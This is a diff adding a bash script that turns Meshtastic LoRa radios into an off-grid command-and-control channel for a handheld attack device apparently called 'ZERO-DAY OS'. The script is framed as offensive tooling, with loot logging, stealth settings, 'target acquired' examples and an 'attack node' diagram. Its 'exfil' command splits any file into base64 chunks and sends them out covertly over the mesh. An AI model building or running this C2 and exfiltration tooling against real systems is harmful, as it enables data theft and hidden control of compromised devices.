@@ -1,0 +1,357 @@
+#!/bin/bash
+# /usr/local/bin/mesh-setup
+# Meshtastic mesh network setup for off-grid C2
+# Uses LoRa modules connected to the Expansion Port (HY2.0-4P Grove)
+#
+# The Cardputer Zero's expansion port supports I2C/UART switchable,
+# which is perfect for Meshtastic devices that communicate over UART.
+#
+# Usage: mesh-setup [command]
+# Commands: install, init, info, send, listen, chat, relay, nodes
+
+COMMAND="${1:-info}"
+LOOT="/opt/cardputer/loot/recon"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+echo "[*] ZERO-DAY OS — Meshtastic Mesh C2"
+echo ""
+
+case "$COMMAND" in
+    install)
+        echo "[*] Installing Meshtastic CLI and dependencies..."
+        if [ "$(id -u)" -ne 0 ]; then
+            echo "[!] Root required."
+            exit 1
+        fi
+
+        # Install Python3 and pip if not present
+        apt install -y --no-install-recommends python3 python3-pip python3-venv 2>/dev/null
+
+        # Install Meshtastic CLI
+        pip3 install meshtastic 2>/dev/null || {
+            echo "[*] pip3 install failed, trying with --break-system-packages..."
+            pip3 install --break-system-packages meshtastic 2>/dev/null
+        }
+
+        # Verify installation
+        if command -v meshtastic &>/dev/null; then
+            echo "[+] Meshtastic CLI installed successfully"
+            echo "[+] Version: $(meshtastic --version 2>/dev/null || echo 'unknown')"
+        else
+            echo "[!] Meshtastic CLI installation failed"
+            echo "[!] Try: pip3 install meshtastic"
+            exit 1
+        fi
+
+        echo ""
+        echo "[*] Wiring instructions for Meshtastic LoRa module:"
+        echo "    Grove Port (HY2.0-4P):"
+        echo "      Pin 1 (VCC)  → LoRa module VCC (3.3V)"
+        echo "      Pin 2 (TXD)  → LoRa module RXD"
+        echo "      Pin 3 (RXD)  → LoRa module TXD"
+        echo "      Pin 4 (GND)  → LoRa module GND"
+        echo ""
+        echo "    Or via UART on ExtPort (2.54-14P):"
+        echo "      Pin 8  (GPIO 14/TXD) → LoRa module RXD"
+        echo "      Pin 10 (GPIO 15/RXD) → LoRa module TXD"
+        echo "      Pin 6  (GND)         → LoRa module GND"
+        echo "      Pin 2  (5V)          → LoRa module VCC"
+        echo ""
+        echo "[*] Supported LoRa modules:"
+        echo "    - RA-01 (SX1276) — 433MHz / 868MHz / 915MHz"
+        echo "    - Reyax RYLR896 — 868MHz / 915MHz"
+        echo "    - Meshtastic RAK4631 — 433MHz / 868MHz / 915MHz"
+        echo "    - Heltec WiFi LoRa 32 — 433MHz / 868MHz / 915MHz"
+        echo ""
+        echo "[+] Next: Connect module and run: mesh-setup init"
+        ;;
+
+    init)
+        echo "[*] Initializing Meshtastic node..."
+        echo ""
+
+        # Try to connect to Meshtastic device via serial
+        SERIAL_DEV=$(ls /dev/ttyUSB* /dev/ttyACM* /dev/serial/by-id/*meshtastic* 2>/dev/null | head -1)
+
+        if [ -n "$SERIAL_DEV" ]; then
+            echo "[+] Found Meshtastic device: $SERIAL_DEV"
+        else
+            echo "[*] No USB Meshtastic device found. Checking UART..."
+            # Check if UART is configured
+            if [ -e "/dev/ttyAMA0" ]; then
+                SERIAL_DEV="/dev/ttyAMA0"
+                echo "[+] Using UART: $SERIAL_DEV"
+            elif [ -e "/dev/ttyS0" ]; then
+                SERIAL_DEV="/dev/ttyS0"
+                echo "[+] Using UART: $SERIAL_DEV"
+            else
+                echo "[!] No serial device found"
+                echo "[!] Connect a Meshtastic LoRa module and retry"
+                echo "[!] Wiring info: mesh-setup install"
+                exit 1
+            fi
+        fi
+
+        echo ""
+        echo "[*] Configuring node..."
+
+        # Set node info
+        NODE_NAME="zeroday-$(hostname | cut -c1-8)"
+        NODE_SHORTNAME="ZD$(date +%H%M)"
+
+        meshtastic --port "$SERIAL_DEV" --set-owner "$NODE_NAME" 2>/dev/null || {
+            # Fallback: use Python API directly
+            python3 -c "
+import meshtastic, meshtastic.serial_interface, meshtastic.tcp_interface
+try:
+    iface = meshtastic.serial_interface.SerialInterface(devPath='$SERIAL_DEV')
+    iface.sendInfo()
+    print('[+] Connected to Meshtastic node')
+    iface.close()
+except Exception as e:
+    print(f'[!] Connection failed: {e}')
+    print('[!] Verify the LoRa module is connected and powered')
+" 2>/dev/null
+        }
+
+        # Set channel config for stealth operation
+        meshtastic --port "$SERIAL_DEV" --set-channel-config mesh 2>/dev/null || true
+
+        # Configure for stealth:
+        # - Disable GPS (don't broadcast location)
+        # - Set short name for the small screen
+        # - Set frequency for your region
+        echo ""
+        echo "[+] Node configured:"
+        echo "    Name: $NODE_NAME"
+        echo "    Short: $NODE_SHORTNAME"
+        echo ""
+        echo "[*] Region frequency settings:"
+        echo "    US:  --set-region US     (902-928 MHz)"
+        echo "    EU:  --set-region EU433  (433 MHz)"
+        echo "    EU:  --set-region EU868  (868 MHz)"
+        echo "    AU:  --set-region AU915  (915 MHz)"
+        echo "    JP:  --set-region JP920  (920 MHz)"
+        echo ""
+        echo "[*] Set your region: meshtastic --port $SERIAL_DEV --set-region US"
+        ;;
+
+    info)
+        echo "[*] Meshtastic Node Information"
+        echo ""
+
+        SERIAL_DEV=$(ls /dev/ttyUSB* /dev/ttyACM* /dev/serial/by-id/*meshtastic* 2>/dev/null | head -1)
+        [ -z "$SERIAL_DEV" ] && SERIAL_DEV="/dev/ttyAMA0"
+
+        if command -v meshtastic &>/dev/null; then
+            meshtastic --port "$SERIAL_DEV" --info 2>/dev/null || {
+                echo "[!] Cannot connect to Meshtastic device"
+                echo "[!] Connect a module and run: mesh-setup init"
+            }
+        else
+            echo "[!] Meshtastic CLI not installed"
+            echo "[!] Run: mesh-setup install"
+        fi
+
+        echo ""
+        echo "[*] Serial port: ${SERIAL_DEV:-not found}"
+        echo "[*] Available serial devices:"
+        ls -la /dev/ttyUSB* /dev/ttyACM* /dev/ttyAMA* /dev/ttyS* 2>/dev/null | grep -v "ttyS0:" || echo "    (none found)"
+        ;;
+
+    send)
+        MESSAGE="$2"
+        DEST="$3"
+
+        if [ -z "$MESSAGE" ]; then
+            echo "Usage: mesh-setup send <message> [destination]"
+            echo ""
+            echo "  message     — Text message to send (encrypted by default)"
+            echo "  destination — Node ID, node name, or 'broadcast' (default)"
+            echo ""
+            echo "Examples:"
+            echo "  mesh-setup send 'Target acquired at 192.168.1.105'"
+            echo "  mesh-setup send 'Exfil data: hash captured' !abc12345"
+            echo "  mesh-setup send 'Radio silent from now' broadcast"
+            exit 0
+        fi
+
+        SERIAL_DEV=$(ls /dev/ttyUSB* /dev/ttyACM* /dev/serial/by-id/*meshtastic* 2>/dev/null | head -1)
+        [ -z "$SERIAL_DEV" ] && SERIAL_DEV="/dev/ttyAMA0"
+
+        if [ -n "$DEST" ] && [ "$DEST" != "broadcast" ]; then
+            echo "[*] Sending encrypted message to $DEST..."
+            meshtastic --port "$SERIAL_DEV" --sendtext "$MESSAGE" --dest "$DEST" 2>/dev/null
+        else
+            echo "[*] Broadcasting encrypted message..."
+            meshtastic --port "$SERIAL_DEV" --sendtext "$MESSAGE" 2>/dev/null
+        fi
+
+        echo "[+] Message sent: $MESSAGE"
+        echo "[$(date '+%Y-%m-%d %H:%M:%S')] TX: $MESSAGE" >> "$LOOT/mesh_log_${TIMESTAMP}.txt"
+        ;;
+
+    listen)
+        echo "[*] Listening for Meshtastic mesh messages..."
+        echo "[*] Press Ctrl+C to stop"
+        echo ""
+
+        SERIAL_DEV=$(ls /dev/ttyUSB* /dev/ttyACM* /dev/serial/by-id/*meshtastic* 2>/dev/null | head -1)
+        [ -z "$SERIAL_DEV" ] && SERIAL_DEV="/dev/ttyAMA0"
+
+        mkdir -p "$LOOT"
+
+        meshtastic --port "$SERIAL_DEV" --listen 2>/dev/null | while read -r line; do
+            echo "$line"
+            echo "[$(date '+%Y-%m-%d %H:%M:%S')] RX: $line" >> "$LOOT/mesh_log_${TIMESTAMP}.txt"
+        done
+        ;;
+
+    chat)
+        echo "[*] ZERO-DAY OS — Meshtastic Chat Mode"
+        echo "[*] Type messages and press Enter to send."
+        echo "[*] Type 'quit' to exit."
+        echo ""
+
+        SERIAL_DEV=$(ls /dev/ttyUSB* /dev/ttyACM* /dev/serial/by-id/*meshtastic* 2>/dev/null | head -1)
+        [ -z "$SERIAL_DEV" ] && SERIAL_DEV="/dev/ttyAMA0"
+
+        # Start listener in background
+        meshtastic --port "$SERIAL_DEV" --listen 2>/dev/null &
+        LISTEN_PID=$!
+
+        while true; do
+            read -r -p "mesh> " MSG
+            if [ "$MSG" = "quit" ] || [ "$MSG" = "exit" ]; then
+                kill "$LISTEN_PID" 2>/dev/null
+                break
+            fi
+            if [ -n "$MSG" ]; then
+                meshtastic --port "$SERIAL_DEV" --sendtext "$MSG" 2>/dev/null
+                echo "[$(date '+%H:%M:%S')] TX: $MSG"
+            fi
+        done
+
+        echo "[*] Chat mode ended."
+        ;;
+
+    relay)
+        echo "[*] ZERO-DAY OS — Mesh Relay Mode"
+        echo "[*] This node will relay all mesh traffic to/from the internet."
+        echo ""
+
+        SERIAL_DEV=$(ls /dev/ttyUSB* /dev/ttyACM* /dev/serial/by-id/*meshtastic* 2>/dev/null | head -1)
+        [ -z "$SERIAL_DEV" ] && SERIAL_DEV="/dev/ttyAMA0"
+
+        # Enable MQTT bridge if internet is available
+        INET_IFACE=$(ip route | awk '/default/{print $5}' | head -1)
+        if [ -n "$INET_IFACE" ]; then
+            echo "[+] Internet available on $INET_IFACE"
+            echo "[*] Enabling MQTT bridge..."
+            meshtastic --port "$SERIAL_DEV" --set-mqtt-enabled true 2>/dev/null || true
+            meshtastic --port "$SERIAL_DEV" --set-mqtt-address "mqtt.meshtastic.org" 2>/dev/null || true
+        else
+            echo "[!] No internet — running as local mesh relay only"
+        fi
+
+        echo "[*] This node is now a relay. Mesh traffic will be forwarded."
+        echo "[*] Press Ctrl+C to stop."
+        echo ""
+
+        meshtastic --port "$SERIAL_DEV" --listen 2>/dev/null
+        ;;
+
+    nodes)
+        echo "[*] Discovered Mesh Nodes"
+        echo ""
+
+        SERIAL_DEV=$(ls /dev/ttyUSB* /dev/ttyACM* /dev/serial/by-id/*meshtastic* 2>/dev/null | head -1)
+        [ -z "$SERIAL_DEV" ] && SERIAL_DEV="/dev/ttyAMA0"
+
+        meshtastic --port "$SERIAL_DEV" --nodes 2>/dev/null || {
+            echo "[!] Cannot enumerate nodes"
+            echo "[!] Connect a module and run: mesh-setup init"
+        }
+        ;;
+
+    exfil)
+        FILE="$2"
+
+        if [ -z "$FILE" ]; then
+            echo "Usage: mesh-setup exfil <file>"
+            echo ""
+            echo "Exfiltrate a file over Meshtastic mesh by splitting it into"
+            echo "small chunks and sending them as encrypted messages."
+            echo ""
+            echo "Maximum payload: ~200 bytes per message"
+            echo "A 1KB file takes ~5 messages (~10 seconds at default settings)"
+            exit 0
+        fi
+
+        if [ ! -f "$FILE" ]; then
+            echo "[!] File not found: $FILE"
+            exit 1
+        fi
+
+        FILESIZE=$(stat -c%s "$FILE" 2>/dev/null || echo "?")
+        CHUNKS=$(( (FILESIZE + 199) / 200 ))
+
+        echo "[*] Exfiltrating file over mesh: $FILE"
+        echo "[*] File size: ${FILESIZE} bytes"
+        echo "[*] Estimated messages: $CHUNKS"
+        echo ""
+
+        SERIAL_DEV=$(ls /dev/ttyUSB* /dev/ttyACM* /dev/serial/by-id/*meshtastic* 2>/dev/null | head -1)
+        [ -z "$SERIAL_DEV" ] && SERIAL_DEV="/dev/ttyAMA0"
+
+        # Encode file as base64 and split into 200-byte chunks
+        CHUNK_NUM=0
+        TOTAL_MD5=$(md5sum "$FILE" | awk '{print $1}')
+
+        echo "[ZD_EXFIL:START:$FILESIZE:$TOTAL_MD5:$(basename "$FILE")]" > /tmp/mesh_exfil_header
+        meshtastic --port "$SERIAL_DEV" --sendtext "[ZD_EXFIL:START:$FILESIZE:$TOTAL_MD5:$(basename "$FILE")]" 2>/dev/null
+
+        base64 "$FILE" | fold -w 180 | while read -r CHUNK; do
+            CHUNK_NUM=$((CHUNK_NUM + 1))
+            MSG="[ZD_EXFIL:$CHUNK_NUM:$CHUNK]"
+            meshtastic --port "$SERIAL_DEV" --sendtext "$MSG" 2>/dev/null
+            printf "\r[*] Sent chunk %d/%d" "$CHUNK_NUM" "$CHUNKS"
+            sleep 2  # Meshtastic default interval
+        done
+
+        meshtastic --port "$SERIAL_DEV" --sendtext "[ZD_EXFIL:END]" 2>/dev/null
+        echo ""
+        echo "[+] File exfiltration complete: $CHUNK_NUM chunks sent"
+        ;;
+
+    *)
+        echo "Usage: mesh-setup [command]"
+        echo ""
+        echo "Commands:"
+        echo "  install   — Install Meshtastic CLI and dependencies"
+        echo "  init      — Initialize and configure a LoRa node"
+        echo "  info      — Show node information and status"
+        echo "  send      — Send an encrypted message over mesh"
+        echo "  listen    — Listen for incoming mesh messages"
+        echo "  chat      — Interactive chat mode"
+        echo "  relay     — Enable mesh relay / internet bridge"
+        echo "  nodes     — List discovered mesh nodes"
+        echo "  exfil     — Exfiltrate a file over mesh (chunked base64)"
+        echo ""
+        echo "Mesh C2 Architecture:"
+        echo "  ┌────────────────┐    LoRa 433/868/915MHz    ┌────────────────┐"
+        echo "  │ Cardputer Zero │◄──────────────────────────►│  Team device   │"
+        echo "  │  (attack node) │  Encrypted mesh messages   │  (C2 node)     │"
+        echo "  └────────────────┘                            └────────────────┘"
+        echo ""
+        echo "  wlan0 (built-in)  → managed mode → internet (if available)"
+        echo "  wlan1 (dongle)    → monitor mode → WiFi attacks"
+        echo "  LoRa (expansion)  → mesh network  → off-grid C2"
+        echo ""
+        echo "Wiring (Grove HY2.0-4P):"
+        echo "  Pin 1 (VCC)  → LoRa VCC (3.3V)"
+        echo "  Pin 2 (TXD)  → LoRa RXD"
+        echo "  Pin 3 (RXD)  → LoRa TXD"
+        echo "  Pin 4 (GND)  → LoRa GND"
+        ;;
+esac
